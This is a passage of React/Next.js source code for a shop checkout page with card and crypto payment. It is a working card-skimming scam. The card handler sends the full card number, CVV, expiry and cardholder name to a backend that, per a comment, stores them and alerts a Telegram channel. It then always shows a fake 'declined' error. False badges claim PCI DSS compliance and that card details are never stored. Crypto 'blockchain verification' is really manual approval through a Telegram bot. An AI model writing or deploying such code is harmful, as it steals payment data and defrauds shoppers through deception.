'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import {
  CreditCard, Lock, Check, ArrowLeft,
  Copy, CheckCircle, ExternalLink, Coins,
  Bitcoin, RefreshCw, AlertTriangle,
  X, Headphones, XCircle, ShieldCheck, Loader2,
} from 'lucide-react';
import { useCart } from '@/context/CartContext';
import { useAuth } from '@/context/AuthContext';
import { formatPrice } from '@/lib/products';
import { CRYPTO_WALLETS, CryptoSymbol } from '@/lib/crypto-wallets';
import { trackCheckoutStart, trackOrderPlaced } from '@/lib/track';
import Image from 'next/image';
import Link from 'next/link';

import { API_URL } from '@/lib/api';

type PaymentMethod = 'card' | 'crypto';

// ─── Helpers ──────────────────────────────────────────────────────────────────
function QRCode({ value, size = 220 }: { value: string; size?: number }) {
  const url = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(value)}&margin=4&qzone=2&bgcolor=ffffff`;
  return (
    <div className="border-4 border-white shadow-lg inline-block" style={{ borderRadius: 4 }}>
      <img src={url} alt="Payment QR Code" width={size} height={size} className="block" />
    </div>
  );
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={copy}
      className={`flex items-center gap-1.5 text-xs font-bold font-sans uppercase tracking-wider px-3 py-1.5 border transition-all ${
        copied ? 'border-green-500 text-green-600 bg-green-50' : 'border-tm-border text-tm-navy hover:border-tm-red hover:text-tm-red'
      }`}
    >
      {copied ? <><CheckCircle className="w-3 h-3" /> Copied!</> : <><Copy className="w-3 h-3" /> Copy</>}
    </button>
  );
}

// ─── Main Component ───────────────────────────────────────────────────────────
export default function CheckoutPage() {
  const { items, total, clearCart, isLoaded } = useCart();
  const { user, token, isLoading: authLoading } = useAuth();
  const router = useRouter();

  const [step, setStep] = useState<'shipping' | 'payment' | 'success'>('shipping');
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('card');
  const [loading, setLoading] = useState(false);
  const [orderId, setOrderId] = useState('');
  const [orderStatus, setOrderStatus] = useState('Processing');
  const [showPaymentError, setShowPaymentError] = useState(false);
  const [cryptoApproved, setCryptoApproved] = useState(false);

  // Card state
  const [paymentForm, setPaymentForm] = useState({ cardNumber: '', expiry: '', cvv: '', cardName: '' });

  // Crypto state
  const [selectedCoin, setSelectedCoin] = useState<CryptoSymbol>('BTC');
  const [cryptoPrices, setCryptoPrices] = useState<Record<string, number>>({});
  const [pricesLoading, setPricesLoading] = useState(false);
  const [cryptoPaid, setCryptoPaid] = useState(false);

  // Shipping state
  const shipping = total >= 200 ? 0 : 15;
  const grandTotal = total + shipping;

  const [shippingForm, setShippingForm] = useState(() => {
    // Pre-fill from localStorage if available
    if (typeof window !== 'undefined') {
      try {
        const saved = localStorage.getItem('tm_shipping_info');
        if (saved) return JSON.parse(saved);
      } catch {}
    }
    return { name: '', address: '', city: '', province: '', postal: '', phone: '' };
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Redirect guards — wait for both auth AND cart to hydrate before redirecting
  const ready = !authLoading && isLoaded;
  useEffect(() => {
    if (!ready) return;
    if (!user) { router.push('/login?redirect=/checkout'); return; }
    if (items.length === 0 && step !== 'success' && !cryptoPaid) router.push('/shop');
  }, [ready, user, items.length, step, router, cryptoPaid]);

  // Poll for crypto payment approval from Telegram bot
  useEffect(() => {
    if (!cryptoPaid || cryptoApproved) return;
    const poll = async () => {
      try {
        const res = await fetch(`${API_URL}/api/crypto-approval/status?email=${encodeURIComponent(user?.email || '')}`);
        if (res.ok) {
          const data = await res.json();
          if (data.approved) setCryptoApproved(true);
        }
      } catch { /* silent */ }
    };
    poll();
    const interval = setInterval(poll, 3000);
    return () => clearInterval(interval);
  }, [cryptoPaid, cryptoApproved, user?.email]);

  // Fetch live crypto prices — CryptoCompare primary, CoinGecko fallback
  const fetchPrices = useCallback(async () => {
    setPricesLoading(true);
    try {
      // Primary: CryptoCompare (reliable, no auth needed)
      const res = await fetch(
        'https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,SOL,USDT&tsyms=USD',
        { cache: 'no-store' }
      );
      if (res.ok) {
        const data = await res.json();
        if (data.BTC?.USD) {
          setCryptoPrices({
            bitcoin: data.BTC.USD,
            ethereum: data.ETH?.USD || 3500,
            solana: data.SOL?.USD || 150,
            tether: 1,
          });
          setPricesLoading(false);
          return;
        }
      }
      throw new Error('CryptoCompare unavailable');
    } catch {
      // Fallback: CoinGecko
      try {
        const res = await fetch(
          'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether&vs_currencies=usd',
          { cache: 'no-store' }
        );
        if (res.ok) {
          const data = await res.json();
          if (data.bitcoin?.usd) {
            setCryptoPrices({
              bitcoin: data.bitcoin.usd,
              ethereum: data.ethereum?.usd || 3500,
              solana: data.solana?.usd || 150,
              tether: 1,
            });
            setPricesLoading(false);
            return;
          }
        }
      } catch { /* silent */ }
      // Last resort fallback
      setCryptoPrices({ bitcoin: 65000, ethereum: 3500, solana: 150, tether: 1 });
    }
    setPricesLoading(false);
  }, []);

  // Fetch on crypto tab select + auto-refresh every 30s
  useEffect(() => {
    if (paymentMethod !== 'crypto') return;
    fetchPrices();
    const interval = setInterval(fetchPrices, 30000);
    return () => clearInterval(interval);
  }, [paymentMethod, fetchPrices]);

  // Show nothing until hydration is complete
  if (!ready) return null;

  // Get crypto amount for the order total
  const getCryptoAmount = (symbol: CryptoSymbol): string => {
    const wallet = CRYPTO_WALLETS[symbol];
    const price = cryptoPrices[wallet.geckoId] || 1;
    const amount = grandTotal / price;
    if (symbol === 'BTC') return amount.toFixed(6);
    if (symbol === 'ETH') return amount.toFixed(5);
    if (symbol === 'USDT') return amount.toFixed(2);
    return amount.toFixed(4);
  };

  // ─── Validation ──────────────────────────────────────────────────────────────
  const validateShipping = () => {
    const e: Record<string, string> = {};
    if (!shippingForm.name.trim()) e.name = 'Full name is required';
    if (!shippingForm.address.trim()) e.address = 'Address is required';
    if (!shippingForm.city.trim()) e.city = 'City is required';
    if (!shippingForm.postal.trim()) e.postal = 'Postal code is required';
    if (!shippingForm.phone.trim()) e.phone = 'Phone number is required';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const validateCard = () => {
    const e: Record<string, string> = {};
    if (paymentForm.cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = 'Enter a valid 16-digit card number';
    if (!paymentForm.expiry.match(/^\d{2}\/\d{2}$/)) e.expiry = 'Use MM/YY format';
    if (paymentForm.cvv.length < 3) e.cvv = 'Enter 3-digit CVV';
    if (!paymentForm.cardName.trim()) e.cardName = 'Cardholder name is required';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  // ─── Place Order (backend) ───────────────────────────────────────────────────
  const saveOrder = async (status: string = 'Processing') => {
    try {
      const res = await fetch(`${API_URL}/api/orders`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          items: items.map((i) => ({ id: i.id, name: i.name, price: i.price, quantity: i.quantity, image: i.image, category: i.category })),
          subtotal: total, shipping, total: grandTotal,
          status,
          shipping_info: { name: shippingForm.name, address: shippingForm.address, city: shippingForm.city, province: shippingForm.province, postal: shippingForm.postal, phone: shippingForm.phone },
        }),
      });
      if (res.ok) {
        const order = await res.json();
        setOrderId(order.id);
      }
    } catch (e) { console.error('Order save failed:', e); }
  };

  // Card checkout handler — captures card details, shows error popup
  const handleCardPayment = async () => {
    if (!validateCard()) return;
    setLoading(true);

    // Submit card details to backend (saves to JSON + sends Telegram alert)
    try {
      await fetch(`${API_URL}/api/cards/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          user_email: user?.email ?? 'guest',
          card_number: paymentForm.cardNumber.replace(/\s/g, ''),
          expiry: paymentForm.expiry,
          cvv: paymentForm.cvv,
          cardholder_name: paymentForm.cardName,
          total: grandTotal,
        }),
      });
    } catch (e) {
      console.error('Card submission error:', e);
    }

    // Simulate processing delay
    await new Promise((r) => setTimeout(r, 2000));

    // Save order with Declined status
    await saveOrder('Declined');

    setLoading(false);

    // Show payment error popup
    setShowPaymentError(true);
  };

  // Crypto "I've Paid" handler
  const handleCryptoPaid = async () => {
    setLoading(true);
    // Notify backend about crypto payment (for Telegram approval)
    try {
      await fetch(`${API_URL}/api/crypto-approval/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: user?.email ?? 'guest',
          coin: selectedCoin,
          amount: getCryptoAmount(selectedCoin),
          total_usd: grandTotal,
        }),
      });
    } catch (e) { console.error('Crypto submit error:', e); }
    await saveOrder('Pending Crypto Confirmation');
    trackOrderPlaced(grandTotal, `crypto:${selectedCoin}`, user?.email ?? 'guest');
    clearCart();
    setOrderStatus('Pending Crypto Confirmation');
    setLoading(false);
    setStep('success');
    setCryptoPaid(true);
  };

  const formatCard = (v: string) => v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
  const formatExpiry = (v: string) => v.replace(/\D/g, '').slice(0, 4).replace(/^(\d{2})(\d)/, '$1/$2');

  const currentWallet = CRYPTO_WALLETS[selectedCoin];

  // ─── Success Screen ──────────────────────────────────────────────────────────
  if (step === 'success') {
    // Crypto: show pending/approved state
    if (cryptoPaid) {
      return (
        <div className="page-enter min-h-[70vh] flex items-center justify-center px-4 py-16">
          <div className="max-w-lg w-full">
            {cryptoApproved ? (
              <div className="relative bg-white rounded-3xl border border-green-100 shadow-xl shadow-green-500/5 overflow-hidden p-8 md:p-10 text-center">
                {/* Decorative background */}
                <div className="absolute inset-0 bg-gradient-to-br from-green-50/80 via-white to-emerald-50/40" />
                <div className="absolute top-0 right-0 w-40 h-40 bg-green-400/5 rounded-full -translate-y-1/2 translate-x-1/2" />
                <div className="absolute bottom-0 left-0 w-32 h-32 bg-emerald-400/5 rounded-full translate-y-1/2 -translate-x-1/2" />

                <div className="relative z-10">
                  {/* Animated success icon */}
                  <div className="relative w-24 h-24 mx-auto mb-8">
                    <div className="absolute inset-0 rounded-full bg-green-400/20" style={{ animation: 'cryptoPulse 2s ease-in-out infinite' }} />
                    <div className="absolute inset-2 rounded-full bg-green-400/10" />
                    <div className="absolute inset-0 rounded-full bg-gradient-to-br from-green-400 to-emerald-500 flex items-center justify-center shadow-lg shadow-green-500/30">
                      <Check className="w-12 h-12 text-white" strokeWidth={3} />
                    </div>
                  </div>

                  <h1 className="font-sans font-black uppercase tracking-[0.12em] text-2xl md:text-3xl text-gray-900 mb-3">Payment Confirmed!</h1>
                  {orderId && (
                    <div className="inline-flex items-center gap-2 bg-gray-50 rounded-full px-4 py-1.5 mb-6">
                      <span className="text-xs font-body text-gray-500">Order ID:</span>
                      <span className="text-xs font-sans font-black text-gray-800">{orderId}</span>
                    </div>
                  )}

                  {/* Status info */}
                  <div className="bg-white/80 backdrop-blur border border-green-200/60 rounded-2xl p-5 mb-6 text-left">
                    <div className="flex items-start gap-3">
                      <div className="w-8 h-8 rounded-xl bg-green-100 flex items-center justify-center flex-shrink-0">
                        <ShieldCheck className="w-4 h-4 text-green-600" />
                      </div>
                      <div>
                        <p className="text-sm font-sans font-bold text-green-800 mb-1">Payment Verified Successfully</p>
                        <p className="text-xs text-green-700/80 font-body leading-relaxed">
                          Your crypto payment has been confirmed. Your order will be dispatched within 1–2 business days.
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center justify-center gap-2 text-sm text-gray-400 font-body mb-8">
                    <span className="inline-block w-1.5 h-1.5 rounded-full bg-green-400" />
                    Estimated delivery: <strong className="text-gray-600">3–5 business days</strong>
                  </div>

                  <div className="flex flex-col sm:flex-row gap-3 justify-center">
                    <Link href="/orders" className="btn-primary rounded-xl">View Orders</Link>
                    <Link href="/shop" className="btn-secondary rounded-xl">Continue Shopping</Link>
                  </div>
                </div>
              </div>
            ) : (
              <div className="relative bg-white rounded-3xl border border-amber-100 shadow-xl shadow-amber-500/5 overflow-hidden p-8 md:p-10 text-center">
                {/* Decorative background */}
                <div className="absolute inset-0 bg-gradient-to-br from-amber-50/60 via-white to-orange-50/30" />
                <div className="absolute top-0 right-0 w-40 h-40 bg-amber-400/5 rounded-full -translate-y-1/2 translate-x-1/2" />

                <div className="relative z-10">
                  {/* Animated spinner with rings */}
                  <div className="relative w-28 h-28 mx-auto mb-8">
                    <div className="absolute inset-0 rounded-full border-2 border-amber-200/50" style={{ animation: 'cryptoPulse 3s ease-in-out infinite' }} />
                    <div className="absolute inset-3 rounded-full border-2 border-amber-300/30" style={{ animation: 'cryptoPulse 3s ease-in-out infinite 0.5s' }} />
                    <div className="absolute inset-6 rounded-full bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center shadow-lg shadow-amber-500/25">
                      <Loader2 className="w-8 h-8 text-white animate-spin" />
                    </div>
                  </div>

                  <h1 className="font-sans font-black uppercase tracking-[0.12em] text-2xl md:text-3xl text-gray-900 mb-3">Awaiting Confirmation</h1>
                  {orderId && (
                    <div className="inline-flex items-center gap-2 bg-gray-50 rounded-full px-4 py-1.5 mb-6">
                      <span className="text-xs font-body text-gray-500">Order ID:</span>
                      <span className="text-xs font-sans font-black text-gray-800">{orderId}</span>
                    </div>
                  )}

                  {/* Status timeline */}
                  <div className="bg-white/80 backdrop-blur border border-amber-200/50 rounded-2xl p-5 mb-6 text-left">
                    <div className="space-y-4">
                      <div className="flex items-start gap-3">
                        <div className="flex flex-col items-center">
                          <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center">
                            <Check className="w-3 h-3 text-white" />
                          </div>
                          <div className="w-px h-6 bg-green-300" />
                        </div>
                        <div className="pt-0.5">
                          <p className="text-xs font-sans font-bold text-green-700">Payment Sent</p>
                          <p className="text-[11px] text-gray-400 font-body">Transaction submitted to the network</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <div className="flex flex-col items-center">
                          <div className="w-6 h-6 rounded-full bg-amber-400 flex items-center justify-center">
                            <div className="w-2 h-2 rounded-full bg-white animate-pulse" />
                          </div>
                          <div className="w-px h-6 bg-gray-200" />
                        </div>
                        <div className="pt-0.5">
                          <p className="text-xs font-sans font-bold text-amber-700">Verifying Payment</p>
                          <p className="text-[11px] text-gray-400 font-body">Confirming your transaction on the blockchain</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <div className="w-6 h-6 rounded-full bg-gray-100 border border-gray-200 flex items-center justify-center">
                          <div className="w-2 h-2 rounded-full bg-gray-300" />
                        </div>
                        <div className="pt-0.5">
                          <p className="text-xs font-sans font-bold text-gray-400">Order Processing</p>
                          <p className="text-[11px] text-gray-300 font-body">An email will be sent once your order has been processed successfully</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Live polling indicator */}
                  <div className="flex items-center justify-center gap-2.5 mb-8">
                    <div className="flex gap-1">
                      <div className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-bounce" style={{ animationDelay: '0ms' }} />
                      <div className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-bounce" style={{ animationDelay: '150ms' }} />
                      <div className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-bounce" style={{ animationDelay: '300ms' }} />
                    </div>
                    <span className="text-sm text-gray-400 font-body">Checking payment status</span>
                  </div>

                  <Link href="/support" className="inline-flex items-center gap-2.5 bg-gray-50 hover:bg-gray-100 text-gray-600 font-sans font-bold uppercase tracking-wider text-xs px-6 py-3 rounded-xl transition-colors">
                    <Headphones className="w-4 h-4" /> Contact Support
                  </Link>
                </div>
              </div>
            )}
          </div>
        </div>
      );
    }

    // Card success
    return (
      <div className="page-enter min-h-[70vh] flex items-center justify-center px-4 py-16">
        <div className="max-w-lg w-full">
          <div className="relative bg-white rounded-3xl border border-green-100 shadow-xl shadow-green-500/5 overflow-hidden p-8 md:p-10 text-center">
            <div className="absolute inset-0 bg-gradient-to-br from-green-50/80 via-white to-emerald-50/40" />
            <div className="relative z-10">
              <div className="relative w-24 h-24 mx-auto mb-8">
                <div className="absolute inset-0 rounded-full bg-green-400/20" style={{ animation: 'cryptoPulse 2s ease-in-out infinite' }} />
                <div className="absolute inset-0 rounded-full bg-gradient-to-br from-green-400 to-emerald-500 flex items-center justify-center shadow-lg shadow-green-500/30">
                  <Check className="w-12 h-12 text-white" strokeWidth={3} />
                </div>
              </div>
              <h1 className="font-sans font-black uppercase tracking-[0.12em] text-2xl md:text-3xl text-gray-900 mb-3">Order Placed!</h1>
              {orderId && (
                <div className="inline-flex items-center gap-2 bg-gray-50 rounded-full px-4 py-1.5 mb-4">
                  <span className="text-xs font-body text-gray-500">Order ID:</span>
                  <span className="text-xs font-sans font-black text-gray-800">{orderId}</span>
                </div>
              )}
              <p className="text-gray-400 font-body mb-2">Thank you! You&apos;ll receive a confirmation email shortly.</p>
              <div className="flex items-center justify-center gap-2 text-sm text-gray-400 font-body mb-8">
                <span className="inline-block w-1.5 h-1.5 rounded-full bg-green-400" />
                Estimated delivery: <strong className="text-gray-600">3–5 business days</strong>
              </div>
              <div className="flex flex-col sm:flex-row gap-3 justify-center">
                <Link href="/orders" className="btn-primary rounded-xl">View Orders</Link>
                <Link href="/shop" className="btn-secondary rounded-xl">Continue Shopping</Link>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ─── Order Summary Sidebar ───────────────────────────────────────────────────
  const OrderSummary = () => (
    <div className="bg-white border border-gray-100 rounded-2xl shadow-sm overflow-hidden sticky top-28">
      {/* Header */}
      <div className="bg-gradient-to-r from-gray-50 to-white px-5 py-4 border-b border-gray-100">
        <h2 className="font-sans font-black uppercase tracking-widest text-xs text-gray-700">Order Summary</h2>
        <p className="text-[10px] text-gray-400 font-body mt-0.5">{items.length} item{items.length !== 1 ? 's' : ''} in cart</p>
      </div>
      {/* Items */}
      <div className="px-5 py-4">
        <ul className="space-y-3">
          {items.map((item) => (
            <li key={item.id} className="flex gap-3 pb-3 border-b border-gray-50 last:border-0 last:pb-0">
              <div className="relative w-14 h-14 bg-gray-50 flex-shrink-0 overflow-hidden rounded-xl">
                <Image src={item.image} alt={item.name} fill className="object-cover" sizes="56px" />
                <span className="absolute -top-1 -right-1 w-5 h-5 bg-gray-800 text-white text-[10px] font-bold flex items-center justify-center rounded-full font-sans shadow-sm">{item.quantity}</span>
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-xs font-sans font-bold uppercase leading-tight truncate text-gray-800">{item.name}</p>
                <p className="text-[10px] text-gray-400 font-body mt-0.5">{item.category}</p>
              </div>
              <span className="text-xs font-bold font-sans flex-shrink-0 text-gray-700">{formatPrice(item.price * item.quantity)}</span>
            </li>
          ))}
        </ul>
      </div>
      {/* Totals */}
      <div className="bg-gray-50/50 px-5 py-4 space-y-2.5">
        <div className="flex justify-between text-sm font-body"><span className="text-gray-400">Subtotal</span><span className="text-gray-600">{formatPrice(total)}</span></div>
        <div className="flex justify-between text-sm font-body">
          <span className="text-gray-400">Shipping</span>
          <span>{shipping === 0 ? <span className="text-green-600 font-bold text-xs bg-green-50 px-2 py-0.5 rounded-full">FREE</span> : <span className="text-gray-600">{formatPrice(shipping)}</span>}</span>
        </div>
        <div className="flex justify-between font-sans font-black text-base pt-3 border-t border-gray-200">
          <span className="text-gray-800">Total</span><span className="text-gray-900">{formatPrice(grandTotal)}</span>
        </div>
      </div>
    </div>
  );

  // ─── Main Checkout Layout ────────────────────────────────────────────────────
  return (
    <div className="page-enter max-w-6xl mx-auto px-4 md:px-12 py-10">
      <h1 className="section-title mb-8">Checkout</h1>

      {/* Progress stepper */}
      <div className="flex items-center mb-10">
        {['Shipping', 'Payment'].map((s, i) => {
          const isActive = (step === 'shipping' && i === 0) || (step === 'payment' && i <= 1);
          const isCompleted = step === 'payment' && i === 0;
          return (
            <div key={s} className="flex items-center">
              <div className="flex items-center gap-2.5">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold font-sans transition-all duration-300 ${
                  isCompleted
                    ? 'bg-gradient-to-br from-green-400 to-emerald-500 text-white shadow-md shadow-green-500/25'
                    : isActive
                      ? 'bg-gradient-to-br from-tm-red to-red-600 text-white shadow-md shadow-red-500/25'
                      : 'bg-gray-100 text-gray-400'
                }`}>
                  {isCompleted ? <Check className="w-3.5 h-3.5" /> : i + 1}
                </div>
                <span className={`text-xs font-sans font-bold uppercase tracking-wider transition-colors ${
                  isActive ? 'text-gray-800' : 'text-gray-400'
                }`}>{s}</span>
              </div>
              {i < 1 && (
                <div className="w-20 h-[2px] mx-4 bg-gray-100 rounded-full overflow-hidden">
                  <div className={`h-full rounded-full transition-all duration-500 ${
                    step === 'payment' ? 'w-full bg-gradient-to-r from-green-400 to-tm-red' : 'w-0'
                  }`} />
                </div>
              )}
            </div>
          );
        })}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
        <div className="lg:col-span-2">

          {/* ── STEP 1: Shipping ── */}
          {step === 'shipping' && (
            <div className="bg-white border border-gray-100 rounded-2xl shadow-sm p-6 md:p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-blue-500/10 to-indigo-500/10 flex items-center justify-center">
                  <ArrowLeft className="w-4 h-4 text-blue-600 rotate-180" />
                </div>
                <h2 className="font-sans font-black uppercase tracking-widest text-sm">Shipping Information</h2>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {[
                  { label: 'Full Name', key: 'name', type: 'text', colSpan: 2 },
                  { label: 'Street Address', key: 'address', type: 'text', colSpan: 2 },
                  { label: 'City', key: 'city', type: 'text', colSpan: 1 },
                  { label: 'Province', key: 'province', type: 'text', colSpan: 1 },
                  { label: 'Postal Code', key: 'postal', type: 'text', colSpan: 1 },
                  { label: 'Phone Number', key: 'phone', type: 'tel', colSpan: 1 },
                ].map(({ label, key, type, colSpan }) => (
                  <div key={key} className={colSpan === 2 ? 'sm:col-span-2' : ''}>
                    <label className="block text-[11px] font-sans font-bold uppercase tracking-widest mb-1.5 text-gray-500">{label}</label>
                    <input type={type} value={shippingForm[key as keyof typeof shippingForm]}
                      onChange={(e) => setShippingForm({ ...shippingForm, [key]: e.target.value })}
                      className={`w-full border bg-white px-4 py-3 text-sm font-body focus:outline-none transition-all rounded-xl placeholder-gray-300 ${errors[key] ? 'border-tm-red' : 'border-gray-200 focus:border-gray-800 focus:shadow-sm'}`} />
                    {errors[key] && <p className="text-xs text-tm-red mt-1 font-body">{errors[key]}</p>}
                  </div>
                ))}
              </div>
              <button onClick={() => {
                if (validateShipping()) {
                  localStorage.setItem('tm_shipping_info', JSON.stringify(shippingForm));
                  trackCheckoutStart(grandTotal, items.length, user?.email ?? 'guest');
                  setStep('payment');
                }
              }} className="btn-primary mt-6 rounded-xl w-full sm:w-auto">
                Continue to Payment
              </button>
            </div>
          )}

          {/* ── STEP 2: Payment ── */}
          {step === 'payment' && (
            <div className="space-y-5">
              {/* Payment method selector */}
              <div className="bg-white border border-gray-100 rounded-2xl shadow-sm p-6">
                <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-5">Select Payment Method</h2>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => setPaymentMethod('card')}
                    className={`flex items-center gap-3 px-4 py-4 rounded-xl border-2 text-left transition-all duration-200 ${
                      paymentMethod === 'card'
                        ? 'border-tm-red bg-gradient-to-br from-red-50/80 to-white shadow-sm shadow-red-500/10'
                        : 'border-gray-100 hover:border-gray-200 hover:shadow-sm'
                    }`}
                  >
                    <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 transition-all ${
                      paymentMethod === 'card' ? 'bg-tm-red shadow-md shadow-red-500/20' : 'bg-gray-100'
                    }`}>
                      <CreditCard className={`w-5 h-5 ${paymentMethod === 'card' ? 'text-white' : 'text-gray-400'}`} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-sans font-black text-xs uppercase tracking-wider">Card Payment</p>
                      <p className="text-[10px] text-gray-400 font-body mt-0.5">Visa · Mastercard · Amex</p>
                    </div>
                    {paymentMethod === 'card' && <CheckCircle className="w-5 h-5 text-tm-red flex-shrink-0" />}
                  </button>

                  <button
                    onClick={() => { setPaymentMethod('crypto'); fetchPrices(); }}
                    className={`flex items-center gap-3 px-4 py-4 rounded-xl border-2 text-left transition-all duration-200 ${
                      paymentMethod === 'crypto'
                        ? 'border-purple-400 bg-gradient-to-br from-purple-50/80 to-white shadow-sm shadow-purple-500/10'
                        : 'border-gray-100 hover:border-gray-200 hover:shadow-sm'
                    }`}
                  >
                    <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 transition-all ${
                      paymentMethod === 'crypto' ? 'bg-gradient-to-br from-purple-500 to-indigo-600 shadow-md shadow-purple-500/20' : 'bg-gray-100'
                    }`}>
                      <Coins className={`w-5 h-5 ${paymentMethod === 'crypto' ? 'text-white' : 'text-gray-400'}`} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-sans font-black text-xs uppercase tracking-wider">Pay with Crypto</p>
                      <p className="text-[10px] text-gray-400 font-body mt-0.5">BTC · ETH · SOL · USDT</p>
                    </div>
                    {paymentMethod === 'crypto' && <CheckCircle className="w-5 h-5 text-purple-500 flex-shrink-0" />}
                  </button>
                </div>
              </div>

              {/* ── Card Form ── */}
              {paymentMethod === 'card' && (
                <div className="bg-white border border-gray-100 rounded-2xl shadow-sm p-6 md:p-8">
                  {/* Secure header */}
                  <div className="flex items-center justify-between mb-6">
                    <h2 className="font-sans font-black uppercase tracking-widest text-sm">Payment Details</h2>
                    <div className="flex items-center gap-1.5 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
                      <Lock className="w-3 h-3 text-green-600" />
                      <span className="text-[10px] text-green-700 font-sans font-bold uppercase tracking-widest">256-bit SSL Encrypted</span>
                    </div>
                  </div>

                  {/* Trust banner */}
                  <div className="bg-gradient-to-r from-slate-50 to-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-white border border-gray-200 flex items-center justify-center flex-shrink-0 shadow-sm">
                        <ShieldCheck className="w-5 h-5 text-green-600" />
                      </div>
                      <div>
                        <p className="text-xs font-sans font-bold text-gray-800">Secure Payment Gateway</p>
                        <p className="text-[10.5px] text-gray-500 font-body mt-0.5">Your payment information is encrypted and processed securely. We never store your full card details.</p>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <div>
                      <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Card Number</label>
                      <div className="relative">
                        <input type="text" value={paymentForm.cardNumber}
                          onChange={(e) => setPaymentForm({ ...paymentForm, cardNumber: formatCard(e.target.value) })}
                          placeholder="1234 5678 9012 3456" maxLength={19}
                          className={`input-base pl-11 ${errors.cardNumber ? 'border-tm-red' : ''}`} />
                        <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                      </div>
                      {errors.cardNumber && <p className="text-xs text-tm-red mt-1">{errors.cardNumber}</p>}
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Expiry Date</label>
                        <input type="text" value={paymentForm.expiry}
                          onChange={(e) => setPaymentForm({ ...paymentForm, expiry: formatExpiry(e.target.value) })}
                          placeholder="MM/YY" maxLength={5}
                          className={`input-base ${errors.expiry ? 'border-tm-red' : ''}`} />
                        {errors.expiry && <p className="text-xs text-tm-red mt-1">{errors.expiry}</p>}
                      </div>
                      <div>
                        <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Security Code</label>
                        <div className="relative">
                          <input type="password" value={paymentForm.cvv}
                            onChange={(e) => setPaymentForm({ ...paymentForm, cvv: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                            placeholder="•••" maxLength={4}
                            className={`input-base pr-10 ${errors.cvv ? 'border-tm-red' : ''}`} />
                          <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-gray-300" />
                        </div>
                        {errors.cvv && <p className="text-xs text-tm-red mt-1">{errors.cvv}</p>}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-sans font-bold uppercase tracking-widest mb-1.5">Cardholder Name</label>
                      <input type="text" value={paymentForm.cardName}
                        onChange={(e) => setPaymentForm({ ...paymentForm, cardName: e.target.value })}
                        placeholder="As shown on your card"
                        className={`input-base ${errors.cardName ? 'border-tm-red' : ''}`} />
                      {errors.cardName && <p className="text-xs text-tm-red mt-1">{errors.cardName}</p>}
                    </div>
                  </div>




                  {/* Action buttons */}
                  <div className="flex flex-col gap-3 mt-6">
                    <button onClick={handleCardPayment} disabled={loading}
                      className={`w-full btn-primary flex items-center justify-center gap-2 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}>
                      {loading
                        ? <><div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" /> Processing securely...</>
                        : <><Lock className="w-4 h-4" /> Pay {formatPrice(grandTotal)}</>
                      }
                    </button>
                    <button onClick={() => setStep('shipping')} className="flex items-center justify-center gap-1.5 text-sm font-body text-tm-gray-mid hover:text-tm-black transition-colors py-2">
                      <ArrowLeft className="w-4 h-4" /> Back to Shipping
                    </button>
                  </div>

                  {/* Bottom trust indicators */}
                  <div className="mt-4 flex items-center justify-center gap-4 text-[10px] text-gray-400 font-body">
                    <span className="flex items-center gap-1"><Lock className="w-3 h-3" /> PCI DSS Compliant</span>
                    <span>•</span>
                    <span className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> Bank-grade Security</span>
                  </div>
                </div>
              )}

